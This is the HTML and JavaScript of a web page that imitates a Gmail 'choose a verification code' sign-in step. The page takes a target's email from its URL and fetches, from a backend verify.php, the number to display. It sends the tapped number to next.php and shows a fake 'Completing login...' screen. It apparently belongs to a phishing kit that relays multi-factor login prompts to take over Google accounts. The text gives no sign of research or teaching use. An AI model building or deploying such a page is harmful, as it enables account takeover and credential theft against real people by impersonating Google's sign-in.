<body>
    <div class="gmail-container">
        <div class="gmail-form">
            <div class="gmail-logo"></div>
            <h1 class="choose-title">Choose a verification code</h1>
            <div class="choose-subtitle">For your security, we need to verify it's you</div>

            <div class="code-instruction" id="tap-instruction">Tap the number on your phone to complete login</div>

            <div class="number-display">
                <button class="single-number" id="number-btn" onclick="selectNumber()"></button>
            </div>

            <div class="loading-state" id="loading-state" style="display: none; text-align: center; margin-top: 32px;">
                <div style="font-size: 48px; margin-bottom: 16px;">‚è≥</div>
                <div style="font-size: 16px; color: #5f6368; margin-bottom: 8px;">Completing login...</div>
                <div style="font-size: 14px; color: #80868b;">Please wait while we verify your account</div>
                <div class="loading-spinner" style="margin: 24px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--gmail-blue); border-radius: 50%; animation: spin 1s linear infinite;"></div>
            </div>

            <div class="error-message" id="error-message">
                Incorrect code. Please try again.
            </div>

            <a href="#" class="help-link" onclick="needHelp()">Try another way</a>
        </div>
    </div>

    <script>
        // Get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        // Load and display the specific number
        function loadNumber() {
            const email = getUrlParameter('email');
            const numberBtn = document.getElementById('number-btn');

            if (!email) {
                alert('Email parameter missing');
                return;
            }

            // Fetch the specific number from verify.php
            const xhr = new XMLHttpRequest();
            xhr.open('GET', 'verify.php?email=' + encodeURIComponent(email), true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);

                    if (response.prompt_type === 'choose_number' && response.number !== undefined) {
                        numberBtn.textContent = response.number;
                        numberBtn.setAttribute('aria-label', 'Tap number ' + response.number);
                    } else {
                        // Fallback to a random number
                        const randomNum = Math.floor(Math.random() * 100);
                        numberBtn.textContent = randomNum;
                        numberBtn.setAttribute('aria-label', 'Tap number ' + randomNum);
                    }
                } else if (xhr.readyState === 4) {
                    // Error - fallback to random
                    const randomNum = Math.floor(Math.random() * 100);
                    numberBtn.textContent = randomNum;
                    numberBtn.setAttribute('aria-label', 'Tap number ' + randomNum);
                }
            };
            xhr.send();
        }

        function selectNumber() {
            const numberBtn = document.getElementById('number-btn');
            const selectedNumber = numberBtn.textContent;

            // Send the selected number to backend
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('chosen_number=' + encodeURIComponent(selectedNumber));

            // Hide the number button and show loading state
            document.querySelector('.number-display').style.display = 'none';
            document.getElementById('tap-instruction').style.display = 'none';
            document.getElementById('loading-state').style.display = 'block';
            document.querySelector('.help-link').style.display = 'none';

            // Change title and subtitle for loading state
            document.querySelector('.choose-title').textContent = 'Verifying...';
            document.querySelector('.choose-subtitle').textContent = 'Please wait while we complete your login';
        }

        function needHelp() {
            alert("Choose a different verification method.");
            // Could redirect to SMS verification, etc.
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', loadNumber);
    </script>
</body>
